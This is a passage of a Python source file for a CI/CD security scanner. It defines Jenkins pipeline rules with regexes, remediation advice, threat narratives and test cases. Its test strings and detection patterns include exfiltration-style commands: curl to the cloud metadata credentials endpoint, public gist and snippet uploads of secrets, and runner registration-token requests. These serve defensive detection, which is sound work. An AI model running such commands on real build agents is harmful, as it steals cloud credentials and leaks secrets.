        remediation=(
            "Pass values via withEnv to avoid inline Groovy interpolation:\n\n"
            "// BAD\n"
            'bat "msbuild ${params.PROJECT} /t:Build"\n\n'
            "// GOOD\n"
            'withEnv(["PROJECT=${params.PROJECT}"]) {\n'
            "    bat 'msbuild %PROJECT% /t:Build'\n"
            "}"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution",
        test_positive=[
            'bat "msbuild ${params.PROJECT_FILE} /t:Build"',
            'bat "nuget restore ${env.SOLUTION_PATH}"',
        ],
        test_negative=[
            "bat 'msbuild solution.sln /t:Build'",
            '// bat "msbuild ${params.PROJECT_FILE}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Groovy GString interpolation inside a bat() call evaluates ${variable} before "
            "the Windows shell sees the command, inserting user-controlled values directly "
            "into the command string without any quoting protection. An attacker who "
            "controls the interpolated parameter can inject CMD metacharacters that execute "
            "arbitrary commands on the Windows build agent."
        ),
    ),
    # =========================================================================
    # SEC7-JK-002: Scripted pipeline node block without label
    # =========================================================================
    Rule(
        id="SEC7-JK-002",
        title="Scripted pipeline node block without agent label — runs on any available node",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-7",
        description=(
            "A scripted Jenkins pipeline uses `node { }` or `node() { }` without specifying "
            "an agent label. This is the scripted-pipeline equivalent of `agent any` "
            "(covered by SEC7-JK-001 for declarative pipelines) — the build can run on "
            "any connected agent, including untrusted cloud spot instances or agents "
            "shared with other teams. In mixed-trust environments, sensitive pipelines "
            "must be constrained to known, trusted nodes."
        ),
        pattern=RegexPattern(
            match=r"^\s*node\s*(?:\(\s*\))?\s*\{",
            exclude=[r"^\s*//", r"node\s*\(\s*['\"]"],
        ),
        remediation=(
            "Specify an agent label:\n\n"
            "// BAD\n"
            "node {\n    stage('Build') { sh 'make' }\n}\n\n"
            "// GOOD\n"
            "node('trusted-linux') {\n    stage('Build') { sh 'make' }\n}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#scripted-pipeline",
        test_positive=[
            "node {\n    stage('Build') { sh 'make' }\n}",
            "node() {\n    checkout scm\n    sh './build.sh'\n}",
        ],
        test_negative=[
            "node('linux') {\n    sh 'make'\n}",
            "node('docker') {\n    docker.image('ubuntu:22.04').inside { sh 'make' }\n}",
            "// node {\n//   sh 'make'\n// }",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "A node() block without a label constraint runs on any available Jenkins agent, "
            "including nodes with elevated cloud or production credentials that the "
            "scripted pipeline does not require. Labelling nodes with their permission "
            "scope and matching pipeline labels to that scope enforces least-privilege for "
            "build execution."
        ),
    ),
    # =========================================================================
    # SEC7-JK-003: docker.withRegistry with null credentials
    # =========================================================================
    Rule(
        id="SEC7-JK-003",
        title="docker.withRegistry called with null credentials — unauthenticated registry push",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-7",
        description=(
            "A Jenkins pipeline calls docker.withRegistry() with null as the credentials "
            "argument, disabling registry authentication. On registries that allow "
            "unauthenticated pushes (some self-hosted or misconfigured registries), this "
            "can overwrite images that are then pulled by other pipelines or production "
            "deployments — an image replacement attack with no identity trail."
        ),
        pattern=RegexPattern(
            match=r"docker\.withRegistry\s*\([^)]*,\s*null\s*\)",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Always provide a credentials ID:\n\n"
            "// BAD\n"
            "docker.withRegistry('https://registry.example.com', null) { docker.build('myapp').push() }\n\n"
            "// GOOD\n"
            "docker.withRegistry('https://registry.example.com', 'registry-creds') { docker.build('myapp').push() }"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/docker/#custom-registry",
        test_positive=[
            "docker.withRegistry('https://registry.example.com', null) { docker.build('myapp').push() }",
            'docker.withRegistry("https://${REGISTRY}", null) { image.push() }',
        ],
        test_negative=[
            "docker.withRegistry('https://registry.example.com', 'my-creds') { docker.build('myapp').push() }",
            "// docker.withRegistry('https://registry.example.com', null)",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "docker.withRegistry() called with null credentials authenticates anonymously "
            "to the registry, meaning pushed images have no access control and are "
            "accessible to anyone who can reach the registry endpoint. On internal "
            "registries, anonymous pushes also make it impossible to audit which build "
            "published which image, breaking the provenance chain."
        ),
    ),
    # =========================================================================
    # SEC8-JK-003: Git checkout from HTTP (non-HTTPS) URL
    # =========================================================================
    Rule(
        id="SEC8-JK-003",
        title="Git repository checked out from non-HTTPS URL — susceptible to MITM code injection",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline checks out source code from a plain HTTP URL. HTTP "
            "connections are unencrypted — a network-level attacker can inject malicious "
            "code into the source tree before the build runs, insert compromised "
            "dependencies, or replace downloaded scripts without any visible error."
        ),
        pattern=RegexPattern(
            match=r"(?:url\s*:\s*['\"]http://|git\s+clone\s+http://)(?!localhost|127\.0\.0\.1)",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Replace HTTP with HTTPS for all repository URLs:\n\n"
            "// BAD\n"
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'http://github.com/org/repo.git']]])\n\n"
            "// GOOD\n"
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'https://github.com/org/repo.git']]])"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#checkout",
        test_positive=[
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'http://github.com/org/repo.git']]])",
            "sh 'git clone http://gitlab.example.com/group/project.git'",
        ],
        test_negative=[
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'https://github.com/org/repo.git']]])",
            "checkout scm",
            "// url: 'http://github.com/org/repo.git'",
        ],
        stride=["T", "I"],
        threat_narrative=(
            "Checking out from a non-HTTPS URL (git:// or http://) sends the repository "
            "contents over an unencrypted connection susceptible to MITM attacks that can "
            "inject malicious code into the checkout. For private repositories, credentials "
            "transmitted over an unencrypted channel are also exposed to any observer on "
            "the network path."
        ),
    ),
    # =========================================================================
    # SEC9-JK-003: wget download without checksum verification
    # =========================================================================
    Rule(
        id="SEC9-JK-003",
        title="wget downloads binary or script without checksum verification",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-9",
        description=(
            "A Jenkins pipeline shell step uses wget to download a binary, archive, or "
            "script file but does not verify its integrity with a checksum. "
            "If the download source is compromised (CDN hijack, DNS poisoning, supply chain "
            "attack), the malicious file runs with full build environment access. "
            "SEC9-JK-001 covers the curl|bash pattern; this rule covers the wget case "
            "where the file is downloaded and later executed without a sha256sum step."
        ),
        pattern=SequencePattern(
            pattern_a=r"sh\s+['\"\{]{1,3}[^'\"\}]*wget\s+.*\.(sh|py|tar\.gz|tgz|zip|exe|bin|deb|rpm)\b",
            absent_within=r"(sha256sum|sha512sum|shasum|md5sum|cosign|gpg\s+--verify)",
            lookahead_lines=5,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Verify the checksum before executing any downloaded file:\n\n"
            "// BAD\n"
            "sh 'wget -q https://releases.example.com/tool-v2.0.tar.gz'\n"
            "sh 'tar xzf tool-v2.0.tar.gz && ./tool-v2.0/install.sh'\n\n"
            "// GOOD\n"
            "sh '''\n"
            "    wget -q https://releases.example.com/tool-v2.0.tar.gz\n"
            "    echo 'abc123def456...  tool-v2.0.tar.gz' | sha256sum --check\n"
            "    tar xzf tool-v2.0.tar.gz && ./tool-v2.0/install.sh\n"
            "'''"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation",
        test_positive=[
            "sh 'wget -q https://releases.example.com/tool-v2.0.tar.gz'",
            "sh 'wget https://example.com/install.sh && bash install.sh'",
        ],
        test_negative=[
            "sh '''\n    wget -q https://example.com/tool.tar.gz\n    echo \"abc123  tool.tar.gz\" | sha256sum --check\n'''",
            "// sh 'wget https://example.com/install.sh'",
        ],
        stride=["T"],
        threat_narrative=(
            "wget downloading a binary or script without checksum verification allows a "
            "compromised server or intercepted connection to silently substitute a "
            "malicious payload. The pipeline then executes attacker-controlled code with "
            "access to the Jenkins agent's credentials and build environment."
        ),
    ),
    # =========================================================================
    # SEC1-JK-002: No timeout in declarative pipeline
    # =========================================================================
    Rule(
        id="SEC1-JK-002",
        title="Declarative pipeline has no timeout — runaway build holds agents and credentials indefinitely",
        severity=Severity.LOW,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A Jenkins declarative pipeline does not contain any timeout() step or option. "
            "Without a timeout, a hung or looping build step holds the agent indefinitely, "
            "keeps credentials bound in memory via withCredentials blocks, and prevents "
            "other builds from running. A DoS via crafted code that hangs can block the "
            "entire CI pipeline. Timeouts are also a control against runaway deployments "
            "that partially apply infrastructure changes."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*pipeline\s*\{",
            absent_within=r"\btimeout\s*\(",
            lookahead_lines=250,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Add a pipeline-level timeout in the options block:\n\n"
            "pipeline {\n"
            "    options {\n"
            "        timeout(time: 30, unit: 'MINUTES')\n"
            "    }\n"
            "    ...\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#options",
        test_positive=[
            "pipeline {\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n}",
        ],
        test_negative=[
            "pipeline {\n  options { timeout(time: 30, unit: 'MINUTES') }\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n}",
            "stage('Build') { steps { timeout(time: 5, unit: 'MINUTES') { sh 'make' } } }",
        ],
        stride=["D", "R"],
        threat_narrative=(
            "Without a global timeout, a compromised or hung step can hold the Jenkins "
            "executor and any bound credentials indefinitely, blocking legitimate builds "
            "and exfiltrating secrets for as long as the runner allows. An explicit timeout "
            "bounds the impact and makes anomalous build durations immediately "
            "visible in the Jenkins dashboard."
        ),
    ),
    # =========================================================================
    # SEC10-JK-001: No post { always } block in declarative pipeline
    # =========================================================================
    Rule(
        id="SEC10-JK-001",
        title="Declarative pipeline has no post { always { } } block — no guaranteed cleanup or audit trail",
        severity=Severity.LOW,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-10",
        description=(
            "A Jenkins declarative pipeline does not contain a post { always { ... } } "
            "block. Without this, there is no guaranteed cleanup or audit logging step "
            "that runs regardless of whether the pipeline succeeds or fails. "
            "In security-sensitive pipelines, post { always } is used to delete temporary "
            "credential files from the workspace, report pipeline completion to a SIEM, "
            "send failure notifications, and clean up test deployments. The absence of "
            "cleanup creates a window where credential files or sensitive artifacts persist "
            "on the agent after a failed build."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*pipeline\s*\{",
            absent_within=r"\bpost\s*\{",
            lookahead_lines=250,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Add a post block with an always section:\n\n"
            "pipeline {\n"
            "    ...\n"
            "    post {\n"
            "        always {\n"
            "            cleanWs()\n"
            "            sh 'rm -f /tmp/*.pem /tmp/*.key'\n"
            "        }\n"
            "        failure {\n"
            '            slackSend message: "Pipeline failed: ${env.BUILD_URL}"\n'
            "        }\n"
            "    }\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#post",
        test_positive=[
            "pipeline {\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n}",
        ],
        test_negative=[
            "pipeline {\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n  post { always { cleanWs() } }\n}",
        ],
        stride=["R"],
        threat_narrative=(
            "Without a post { always { } } block there is no guaranteed cleanup path — "
            "temporary credentials written to disk, debug artifacts, or sensitive workspace "
            "files may persist on the agent between builds. post { always } is also where "
            "audit logging hooks, notification steps, and forensic artifact uploads should "
            "live; omitting it silently removes the audit trail."
        ),
    ),
    # =========================================================================
    # SEC6-JK-008: Exfil-shaped primitive in Jenkinsfile sh step.
    # Jenkins port of SEC6-GH-008 (Wiz prt-scan class, April 2026).
    #
    # Jenkins has no native `gh gist` integration the way GitHub
    # Actions does, so the IOC set is narrower than GH's — and less
    # niche: Jenkins agents are self-hosted by default, so the IMDS
    # and runner-registration primitives directly apply.  Primitives:
    #
    #   (a) IMDS via curl/wget — 169.254.169.254 / [fd00:ec2::254].
    #       On self-hosted cloud runners (EC2 / GCE / Azure VM)
    #       IMDS returns temporary instance-role credentials.  Jenkins
    #       deployments very commonly live on self-hosted cloud VMs,
    #       making this the highest-signal IOC on the platform.
    #   (b) gh gist / gh api /gists — less common on Jenkins (agents
    #       don't typically have `gh` installed) but when present, a
    #       direct analog of the GH rule's primitive.
    #   (c) glab snippet / glab api /snippets — Jenkins builds of
    #       GitLab-hosted projects may have `glab` installed.
    #   (d) Explicit POST to /actions/runners/registration-token
    #       (GitHub self-hosted runner enrollment).  A Jenkins
    #       pipeline that enrols a GH runner is an ops pattern; on
    #       fork-reachable triggers it becomes a runner-hijack
    #       primitive.
    #
    # File-scoped because the Jenkinsfile is one segment.
    # =========================================================================
    Rule(
        id="SEC6-JK-008",
        title=(
            "Exfil-shaped primitive in Jenkinsfile sh step "
            "(IMDS / gist / snippet / runner-register)"
        ),
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkinsfile ``sh '...'`` step invokes a primitive that "
            "matches the exfiltration signature used by the Wiz-"
            "disclosed prt-scan campaign (April 2026) and the "
            "Stawinski PyTorch / Praetorian self-hosted-runner "
            "compromises:\n"
            "  - ``curl 169.254.169.254`` / ``wget 169.254.169.254`` "
            "(and IPv6 ``[fd00:ec2::254]``) — IMDS on cloud-compute "
            "agents yields temporary instance-role credentials.  "
            "Jenkins deployments are usually self-hosted on cloud "
            "VMs, which makes this the highest-signal IOC on the "
            "platform.\n"
            "  - ``gh gist create`` / ``gh api /gists`` — public-"
            "gist drop channel.\n"
            "  - ``glab snippet create`` / ``glab api`` targeting "
            "``/snippets`` — GitLab-snippet drop channel when the "
            "agent has ``glab`` installed.\n"
            "  - ``curl -X POST .../actions/runners/registration-"
            "token`` — GitHub self-hosted runner enrolment.  On "
            "fork-reachable triggers lets an attacker register "
            "their own machine as a runner for the victim's org.\n"
            "Each primitive has legitimate uses; the rule surfaces "
            "presence for reviewer verification.  Signal is "
            "especially high when the Jenkinsfile also references "
            "PR-context variables (``env.CHANGE_*`` / ``ghprb*``)."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                # IMDS — IPv4 + IPv6
                r"\b(?:curl|wget|http)\s+[^#\n]*169\.254\.169\.254"
                r"|\b(?:curl|wget|http)\s+[^#\n]*\[fd00:ec2::254\]"
                # gh gist drop channels
                r"|\bgh\s+gist\s+create\b"
                r"|\bgh\s+api\s+/gists\b"
                # glab snippet drop channels
                r"|\bglab\s+snippet\s+create\b"
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*"
                r"/snippets\b"
                # gh runner registration token — GH self-hosted runner.
                # Allow `-X POST` / `--method POST` / flags between `gh api`
                # and the path (common shape on Jenkins where the whole
                # command is a one-liner inside `sh '...'`).
                r"|\bgh\s+api\b[^#\n]*/actions/runners/(?:registration|remove)-token"
                r"|\b(?:curl|wget)\s+[^#\n]*/actions/runners/registration-token"
                # glab runner registration via curl or glab api
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*/runners\b"
                r")"
            ),
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
            ],
        ),
        remediation=(
            "Per-primitive remediation (same shape as SEC6-GH-008):\n"
            "  - `curl 169.254.169.254` (IMDS) — if the pipeline runs\n"
            "    on a self-hosted cloud agent, narrow the instance\n"
            "    role (single ARN, not `*:*`), require IMDSv2, set\n"
            "    hop-limit 1.  Prefer federated credentials (AWS\n"
            "    IRSA / GCP workload identity / Azure MI) over\n"
            "    instance roles where feasible.  Never query IMDS\n"
            "    from a PR-triggered build.\n"
            "  - `gh gist create` / `glab snippet create` — use a\n"
            "    tagged release + `gh release upload` /\n"
            "    `glab release upload` instead.  Snippets and gists\n"
            "    default to public / project-visible and leak the\n"
            "    data to anyone with the URL.\n"
            "  - Runner registration-token POST — only legitimate\n"
            "    in an ops pipeline.  On Multibranch / PR-builder\n"
            "    triggers the primitive lets an attacker register\n"
            "    their own machine and hijack future jobs on the\n"
            "    runner label.  Move to a main-branch-only stage\n"
            "    with a Jenkins `input()` approval gate.\n"
            "Run `taintly --guide SEC6-GH-008` for the full\n"
            "checklist (the GH guide applies directly — Jenkins\n"
            "has the same IOC classes)."
        ),
        reference=(
            "https://www.wiz.io/blog/six-accounts-one-actor-inside-the-prt-scan-supply-chain-campaign; "
            "https://safedep.io/prt-scan-github-actions-exfiltration-campaign/; "
            "https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/; "
            "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-options.html"
        ),
        test_positive=[
            # IMDS curl inside sh step
            "node { sh 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/' }",
            # IMDS wget
            "pipeline { agent any; stages { stage('x') { steps { sh 'wget -q -O - http://169.254.169.254/' } } } }",
            # gh gist drop
            "node { sh 'gh gist create secrets.txt --public' }",
            # glab snippet drop
            "node { sh 'glab snippet create --title exfil --content @data.json' }",
            # Runner registration token via gh api
            "node { sh 'gh api /repos/org/repo/actions/runners/registration-token' }",
            # Runner registration via glab
            "node { sh 'glab api -X POST /runners -F token=$TOK' }",
        ],
        test_negative=[
            # gh release upload — legitimate
            "node { sh 'gh release upload v1.0 dist/artifact.zip' }",
            # IMDS IP mentioned in a comment
            "node { // IMDS is at 169.254.169.254 — don't curl it\n    sh 'make build' }",
            # Plain curl to a normal URL
            "node { sh 'curl https://api.example.com/health' }",
            # gh api read (GET, no POST)
            "node { sh 'gh api /user' }",
            # Runner list (GET, not registration-token POST)
            "node { sh 'gh api /repos/o/r/actions/runners' }",
            # Commented out — line-leading `//` is the Groovy idiom our
            # `^\s*//` exclude catches.  Block comments `/* ... */` that
            # span or embed a mid-line anchor are a known limitation of
            # the line-based scan and would need a Groovy tokenizer.
            "node {\n    // sh 'curl 169.254.169.254'\n    sh 'echo hi'\n}",
        ],
        stride=["I", "E", "R"],
        threat_narrative=(
            "Jenkins' self-hosted default makes IMDS the sharpest "
            "primitive in the exfil set.  A Jenkins agent running "
            "on an EC2 instance with an instance profile can query "
            "``http://169.254.169.254/latest/meta-data/iam/"
            "security-credentials/`` and receive temporary AWS "
            "credentials for whatever role the instance holds.  "
            "On an agent whose role is overly-scoped (`*:*`, or "
            "broad production bucket access), this becomes the "
            "cloud-account pivot.  Stawinski's PyTorch post-mortem "
            "(Jan 2024) and the Praetorian TensorFlow write-up "
            "document IMDS + runner-registration as the chain for "
            "self-hosted-runner compromise — a chain that applies "
            "identically to Jenkins agents."
        ),
        confidence="low",
        incidents=[
            "prt-scan (Wiz, Apr 2026) — GH analog",
            "PyTorch supply chain (Stawinski, Jan 2024) — GH analog",
            "TensorFlow self-hosted runner (Praetorian, 2024) — GH analog",
        ],
    ),
    # =========================================================================
    # SEC3-JK-004: pip --extra-index-url without --index-url — dependency
    # confusion.  Jenkins port of SEC3-GH-008 / SEC3-GL-004.  The resolver
    # bug is a pip property (highest-version-wins merge across indexes), so
    # the attack class is identical on any platform that shells out to pip.
    # Incident reference: PyTorch dependency confusion, December 2022.
    # =========================================================================
    Rule(
        id="SEC3-JK-004",
        title="pip --extra-index-url used without --index-url (dependency confusion, Jenkins)",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins pipeline shell step invokes pip install with "
            "``--extra-index-url`` (adds a secondary index) without "
            "``--index-url`` (replaces the primary).  pip's resolver "
            "merges both indexes with highest-version-wins semantics, "
            "and public PyPI names are first-party-registerable.  An "
            "attacker who registers your private package name on "
            "public PyPI with a higher version number wins the "
            "resolution — the PyTorch dependency-confusion incident "
            "of December 2022 used this exact shape."
        ),
        pattern=RegexPattern(
            match=r"pip\s+install[^\n]*--extra-index-url",
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
                # Paired with --index-url is the safe form.
                r"--index-url\b(?!\s*=?\s*https?://pypi\.org)",
            ],
        ),
        remediation=(
            "Use --index-url to point pip at your private index\n"
            "exclusively, and mirror required public packages into it.\n"
            "If you must consult public PyPI, use a tool that supports\n"
            "explicit package-to-index pinning (uv, poetry's source\n"
            "priority='explicit', or pip-tools with hash-locking):\n\n"
            "// BAD — public PyPI can win resolution for private names\n"
            "sh 'pip install --extra-index-url https://pypi.internal.corp/ mypackage'\n\n"
            "// GOOD — only the private index is consulted; mirror\n"
            "// public packages into it via Artifactory or Nexus\n"
            "sh 'pip install --index-url https://pypi.internal.corp/ mypackage'"
        ),
        reference="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610",
        test_positive=[
            "sh 'pip install --extra-index-url https://pypi.internal.corp/ mypackage'",
            'sh "pip install -r requirements.txt --extra-index-url https://internal/"',
        ],
        test_negative=[
            "sh 'pip install --index-url https://pypi.internal.corp/ mypackage'",
            "// legacy: pip install --extra-index-url https://internal/",
            "sh 'pip install requests'",
        ],
        stride=["T", "S"],
        threat_narrative=(
            "Dependency confusion exploits pip's permissive resolver: "
            "when a private package name is also registerable on public "
            "PyPI, an attacker uploads a same-named package with a "
            "higher version number and pip silently prefers it.  The "
            "malicious package's install hooks execute as the build "
            "user with access to any ``withCredentials`` scope active "
            "at install time and the Jenkins agent's SCM credentials."
        ),
        incidents=["PyTorch dependency confusion (Dec 2022, GH analog)"],
    ),
    # =========================================================================
    # SEC8-JK-004: Docker agent with `args '--privileged'` — container
    # escape primitive.  Jenkins port of SEC8-GH-004.  Declarative pipeline
    # form: ``agent { docker { image '...' args '--privileged' } }``.
    # Scripted form: ``docker.image('...').inside('--privileged')`` or
    # ``docker.image('...').withRun('--privileged')``.  A privileged
    # container has full kernel capability access and can escape its
    # namespace — on a non-ephemeral Jenkins agent this persists across
    # subsequent builds that land on the same host.
    # =========================================================================
    Rule(
        id="SEC8-JK-004",
        title="Docker agent or container run with --privileged (container escape primitive)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline starts a Docker agent or container "
            "with the ``--privileged`` flag — either as "
            "``agent { docker { image '...' args '--privileged' } }`` "
            "in declarative syntax, or as "
            "``docker.image('...').inside('--privileged') { ... }`` / "
            "``docker.image('...').withRun('--privileged') { ... }`` "
            "in scripted syntax.  Privileged containers have full "
            "access to all Linux kernel capabilities and host devices: "
            "they can mount the host filesystem, escape the container "
            "namespace, load kernel modules, and interact with the "
            "Docker socket.\n"
            "\n"
            "Unlike GitHub-hosted runners (ephemeral single-job VMs), "
            "Jenkins agents are typically long-lived and shared across "
            "builds — a container escape on one build persists across "
            "subsequent builds that land on the same agent, poisoning "
            "future workflows and exposing their credentials.  Most "
            "build use cases (compile, test, package) work correctly "
            "without ``--privileged``."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                # Declarative: `args '--privileged'` / `args \"--privileged\"`
                r"\bargs\s+['\"][^'\"]*--privileged\b"
                # Scripted: `.inside('--privileged')` / `.withRun('--privileged')`
                r"|\.(?:inside|withRun)\s*\(\s*['\"][^'\"]*--privileged\b"
                # Shell-level docker run (occasionally seen in Jenkinsfiles).
                r"|\bdocker\s+run\b[^\n]*--privileged\b"
                r")"
            ),
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Remove the --privileged flag.  Most build containers don't\n"
            "need it.  If your build genuinely requires elevated\n"
            "capabilities (e.g., binfmt_misc for cross-arch builds),\n"
            "request only the specific Linux capability it needs:\n\n"
            "// BAD\n"
            "agent { docker { image 'builder:1.0' args '--privileged' } }\n\n"
            "// GOOD — narrow capability instead of full privilege\n"
            "agent { docker { image 'builder:1.0' args '--cap-add=SYS_PTRACE' } }\n\n"
            "If the build step must run on a Docker-in-Docker setup\n"
            "(building images), isolate it to a dedicated, ephemeral\n"
            "Jenkins agent node whose host is not shared with other\n"
            "pipelines — a container escape there can't reach builds\n"
            "running elsewhere."
        ),
        reference="https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities",
        test_positive=[
            # Declarative single-quoted args.
            "agent { docker { image 'ubuntu:22.04' args '--privileged' } }",
            # Declarative multi-flag args.
            "agent { docker { image 'builder' args '-v /tmp:/tmp --privileged' } }",
            # Scripted .inside()
            "docker.image('ubuntu:22.04').inside('--privileged') { sh 'make' }",
            # Scripted .withRun()
            "docker.image('builder').withRun('--privileged --rm') { c -> sh 'work' }",
            # Shell-level docker run.
            "sh 'docker run --privileged --rm ubuntu:22.04 make'",
        ],
        test_negative=[
            # No --privileged.
            "agent { docker { image 'ubuntu:22.04' args '-v /tmp:/tmp' } }",
            # Narrow capability instead of blanket privilege.
            "agent { docker { image 'builder' args '--cap-add=SYS_PTRACE' } }",
            # Plain inside without args.
            "docker.image('ubuntu:22.04').inside { sh 'make' }",
            # Comment line.
            "// agent { docker { image 'x' args '--privileged' } }",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "A privileged Docker container has full access to all host "
            "kernel capabilities and can escape the container namespace "
            "into the Jenkins agent itself.  On shared, long-lived "
            "Jenkins agents a single compromised privileged build "
            "compromises the host: subsequent builds on the same agent "
            "inherit the poisoned environment, and any "
            "``withCredentials`` scope used by any future pipeline "
            "running on that agent becomes readable to an attacker who "
            "persisted a hook (e.g., a modified shell profile, a "
            "backdoored binary in the agent's PATH)."
        ),
    ),
    # =========================================================================
    # SEC4-JK-007: Security gate keyed on a spoofable PR-author / actor
    # identity.  Jenkins port of SEC4-GH-010.  The JK analog of
    # ``github.actor`` is ``env.CHANGE_AUTHOR`` (Multibranch) /
    # ``env.ghprbPullAuthorLogin`` (legacy GHPRB) / ``env.BUILD_USER``
    # (Build User Vars plugin) / ``params.TRIGGERED_BY`` — all string
    # values that an attacker can spoof by setting up a matching fork
    # account or by pushing a follow-up commit after a trusted actor's
    # build.  Same confused-deputy class as the Dependabot auto-merge
    # bypass on GitHub.
    # =========================================================================
    Rule(
        id="SEC4-JK-007",
        title=("Security gate uses spoofable CHANGE_AUTHOR / ghprb / BUILD_USER identity check"),
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkinsfile gates access — a ``when { expression "
            "{ ... } }`` block, a Groovy ``if`` check, or a "
            "conditional step — on a string equality against "
            "``env.CHANGE_AUTHOR``, ``env.ghprbPullAuthorLogin``, "
            "``env.BUILD_USER``, or ``params.TRIGGERED_BY``.  "
            "These fields reflect the user who triggered the build, "
            "not a cryptographic identity: an attacker can register "
            "a fork account with the matching login, or push a "
            "follow-up commit after a trusted actor's run, and "
            "inherit the gate's trust level.  The same confused-"
            "deputy pattern as ``github.actor`` on GitHub Actions."
        ),
        pattern=RegexPattern(
            match=(
                # Groovy equality / regex-match against identity fields
                r"\benv\.(?:CHANGE_AUTHOR(?:_EMAIL|_DISPLAY_NAME)?"
                r"|ghprbPullAuthorLogin(?:Mention)?"
                r"|ghprbTriggerAuthor(?:Login|Email)?"
                r"|BUILD_USER(?:_ID|_EMAIL)?)\b"
                r"\s*(?:==|!=|=~|equals\s*\()"
                r"\s*['\"/]"
            ),
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
            ],
        ),
        remediation=(
            "Don't gate access on a string-match against an identity\n"
            "field the attacker can set.  Safer shapes:\n\n"
            "1. Gate on branch / ref identity — only the repo owner\n"
            "   can push to a protected branch:\n\n"
            "       when { branch 'main' }\n\n"
            "2. Gate on ``changeRequest()`` vs ``NOT changeRequest()``\n"
            "   — different trust models for PR builds vs pushes:\n\n"
            "       when { not { changeRequest() } }\n\n"
            "3. For bot-account auto-merge, use the Jenkins credential\n"
            "   store to bind a scoped token tied to the bot's\n"
            "   authentication rather than a string check — a fork-\n"
            "   account takeover can fake the login string but can't\n"
            "   mint the bot's API token.\n\n"
            "4. For ``parameters { string ... }`` inputs that drive\n"
            "   access control, validate against a strict allowlist\n"
            "   and fail the build on mismatch — never trust the\n"
            "   parameter value directly."
        ),
        reference=(
            "https://www.jenkins.io/doc/book/pipeline/syntax/"
            "#when; "
            "https://docs.github.com/en/actions/security-for-github-"
            "actions/security-guides/security-hardening-for-github-"
            "actions#using-permissions-to-restrict-access-to-secrets"
        ),
        test_positive=[
            # Classic equality
            "when { expression { env.CHANGE_AUTHOR == 'dependabot[bot]' } }",
            "if (env.ghprbPullAuthorLogin == 'renovate-bot') {",
            "if (env.BUILD_USER == 'ci-maintainer') {",
            # Groovy regex-match
            "if (env.CHANGE_AUTHOR =~ /^(dependabot|renovate)/) {",
            # Trigger-author arm
            "when { expression { env.ghprbTriggerAuthorLogin == 'release-bot' } }",
        ],
        test_negative=[
            # Safe shape — branch-based gating
            "when { branch 'main' }",
            # changeRequest() semantic
            "when { not { changeRequest() } }",
            # Comparing to non-string (e.g. null-check) — not a gate
            "if (env.CHANGE_AUTHOR != null) { echo 'PR build' }",
            # Comment
            "// if (env.CHANGE_AUTHOR == 'bot') {",
            "# when { expression { env.CHANGE_AUTHOR == 'bot' } }",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "``env.CHANGE_AUTHOR`` and related identity fields are "
            "populated from SCM metadata with no cryptographic "
            "binding to the triggering user.  An attacker who "
            "registers a fork account whose login matches the "
            "allow-listed value satisfies the gate; on long-lived "
